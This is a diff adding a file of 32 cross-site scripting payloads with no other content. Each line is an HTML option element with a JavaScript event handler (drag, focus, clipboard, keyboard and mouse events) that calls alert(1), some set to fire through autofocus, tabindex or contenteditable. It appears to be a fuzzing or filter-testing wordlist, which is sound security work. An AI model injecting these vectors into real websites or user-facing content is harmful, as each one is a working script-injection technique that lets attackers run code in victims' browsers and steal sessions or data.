@@ -1,0 +1,32 @@
+<option draggable="true" ondrag="alert(1)">test</option>
+<option draggable="true" ondragend="alert(1)">test</option>
+<option draggable="true" ondragenter="alert(1)">test</option>
+<option draggable="true" ondragleave="alert(1)">test</option>
+<option draggable="true" ondragstart="alert(1)">test</option>
+<option id=x tabindex=1 onactivate=alert(1)></option>
+<option id=x tabindex=1 onbeforeactivate=alert(1)></option>
+<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>
+<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>
+<option id=x tabindex=1 onfocus=alert(1)></option>
+<option id=x tabindex=1 onfocusin=alert(1)></option>
+<option onbeforecopy="alert(1)" contenteditable>test</option>
+<option onbeforecut="alert(1)" contenteditable>test</option>
+<option onbeforepaste="alert(1)" contenteditable>test</option>
+<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>
+<option onclick="alert(1)">test</option>
+<option oncontextmenu="alert(1)">test</option>
+<option oncopy="alert(1)" contenteditable>test</option>
+<option oncut="alert(1)" contenteditable>test</option>
+<option ondblclick="alert(1)">test</option>
+<option onfocusout=alert(1) tabindex=1 id=x></option><input autofocus>
+<option onkeydown="alert(1)" contenteditable>test</option>
+<option onkeypress="alert(1)" contenteditable>test</option>
+<option onkeyup="alert(1)" contenteditable>test</option>
+<option onmousedown="alert(1)">test</option>
+<option onmouseenter="alert(1)">test</option>
+<option onmouseleave="alert(1)">test</option>
+<option onmousemove="alert(1)">test</option>
+<option onmouseout="alert(1)">test</option>
+<option onmouseover="alert(1)">test</option>
+<option onmouseup="alert(1)">test</option>
+<option onpaste="alert(1)" contenteditable>test</option>
